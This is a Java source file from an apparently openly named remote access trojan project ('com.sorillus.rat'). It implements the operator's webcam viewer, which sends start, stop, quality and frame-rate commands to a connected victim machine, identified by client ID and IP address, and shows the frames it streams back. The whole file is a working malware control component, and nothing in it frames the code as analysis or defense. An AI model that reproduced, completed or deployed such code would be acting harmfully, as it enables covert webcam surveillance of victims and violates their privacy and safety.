package com.sorillus.rat;

import com.formdev.flatlaf.FlatDarkLaf;
import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;

public class WebcamViewer {
    private JFrame frame;
    private JLabel imageLabel;
    private JToggleButton webcamToggle;
    private Server.ClientHandler clientHandler;
    private volatile boolean running = true;
    private volatile boolean webcamActive = false;

    public WebcamViewer(Server.ClientHandler clientHandler) {
        try {
            UIManager.setLookAndFeel(new FlatDarkLaf());
        } catch (Exception e) {
            System.err.println("Failed to set FlatLaf: " + e.getMessage());
        }

        this.clientHandler = clientHandler;
        clientHandler.setWebcamViewer(this);

        frame = new JFrame("Webcam Viewer - " + clientHandler.getClientId() + " (" + clientHandler.getIpAddress() + ")");
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        frame.setSize(800, 600);
        frame.setLayout(new BorderLayout());

        frame.addWindowListener(new java.awt.event.WindowAdapter() {
            @Override
            public void windowClosing(java.awt.event.WindowEvent windowEvent) {
                running = false;
                if (webcamActive) {
                    clientHandler.sendCommand("WEBCAM_STOP");
                    webcamActive = false;
                }
                clientHandler.setWebcamViewer(null);
            }
        });

        imageLabel = new JLabel();
        imageLabel.setHorizontalAlignment(JLabel.CENTER);
        frame.add(new JScrollPane(imageLabel), BorderLayout.CENTER);

        JPanel controlPanel = new JPanel(new FlowLayout());
        webcamToggle = new JToggleButton("Start Webcam");
        webcamToggle.addActionListener(e -> {
            if (webcamToggle.isSelected()) {
                System.out.println("Requesting webcam start for client: " + clientHandler.getClientId());
                clientHandler.sendCommand("WEBCAM_START");
                webcamToggle.setText("Stop Webcam");
                webcamActive = true;
            } else {
                System.out.println("Requesting webcam stop for client: " + clientHandler.getClientId());
                clientHandler.sendCommand("WEBCAM_STOP");
                webcamToggle.setText("Start Webcam");
                webcamActive = false;
            }
        });

        JButton qualityButton = new JButton("Set Quality");
        qualityButton.addActionListener(e -> {
            String quality = JOptionPane.showInputDialog(frame, "Enter quality (0.1 to 1.0):", "0.5");
            if (quality != null) {
                try {
                    float q = Float.parseFloat(quality);
                    if (q >= 0.1 && q <= 1.0) {
                        clientHandler.sendCommand("QUALITY:" + q);
                    } else {
                        JOptionPane.showMessageDialog(frame, "Quality must be between 0.1 and 1.0", "Error", JOptionPane.ERROR_MESSAGE);
                    }
                } catch (NumberFormatException ex) {
                    JOptionPane.showMessageDialog(frame, "Invalid quality value", "Error", JOptionPane.ERROR_MESSAGE);
                }
            }
        });

        JButton fpsButton = new JButton("Set FPS");
        fpsButton.addActionListener(e -> {
            String fps = JOptionPane.showInputDialog(frame, "Enter FPS (1 to 30):", "5");
            if (fps != null) {
                try {
                    int f = Integer.parseInt(fps);
                    if (f >= 1 && f <= 30) {
                        clientHandler.sendCommand("FPS:" + f);
                    } else {
                        JOptionPane.showMessageDialog(frame, "FPS must be between 1 and 30", "Error", JOptionPane.ERROR_MESSAGE);
                    }
                } catch (NumberFormatException ex) {
                    JOptionPane.showMessageDialog(frame, "Invalid FPS value", "Error", JOptionPane.ERROR_MESSAGE);
                }
            }
        });

        controlPanel.add(webcamToggle);
        controlPanel.add(qualityButton);
        controlPanel.add(fpsButton);
        frame.add(controlPanel, BorderLayout.SOUTH);

        frame.setLocationRelativeTo(null);
        frame.setVisible(true);

        // Запрашиваем наличие вебкамер
        System.out.println("Requesting webcam list from client: " + clientHandler.getClientId());
        clientHandler.sendCommand("LIST_WEBCAMS");
    }

    public void updateWebcamFrame(BufferedImage frameImage) {
        if (frameImage != null) {
            System.out.println("Received webcam frame for client: " + clientHandler.getClientId());
            Image scaledImage = frameImage.getScaledInstance(imageLabel.getWidth(), imageLabel.getHeight(), Image.SCALE_SMOOTH);
            imageLabel.setIcon(new ImageIcon(scaledImage));
        } else {
            System.err.println("Received null webcam frame for client: " + clientHandler.getClientId());
        }
    }

    public void updateWebcamList(String response) {
        System.out.println("Received webcam list response: " + response);
        String[] parts = response.split(":");
        if (parts.length > 1) {
            String status = parts[1];
            if ("NONE".equals(status)) {
                JOptionPane.showMessageDialog(frame, "No webcams found on the client.", "Info", JOptionPane.INFORMATION_MESSAGE);
                webcamToggle.setEnabled(false);
            } else if ("AVAILABLE".equals(status)) {
                webcamToggle.setEnabled(true);
                System.out.println("Webcams are available on client: " + clientHandler.getClientId());
            } else if ("ERROR".equals(status) && parts.length > 2) {
                JOptionPane.showMessageDialog(frame, "Error listing webcams: " + parts[2], "Error", JOptionPane.ERROR_MESSAGE);
                webcamToggle.setEnabled(false);
            }
        }
    }

    public void handleWebcamError(String errorMessage) {
        System.err.println("Webcam error for client " + clientHandler.getClientId() + ": " + errorMessage);
        JOptionPane.showMessageDialog(frame, "Webcam error: " + errorMessage, "Error", JOptionPane.ERROR_MESSAGE);
        webcamToggle.setSelected(false);
        webcamToggle.setText("Start Webcam");
        webcamActive = false;
    }
}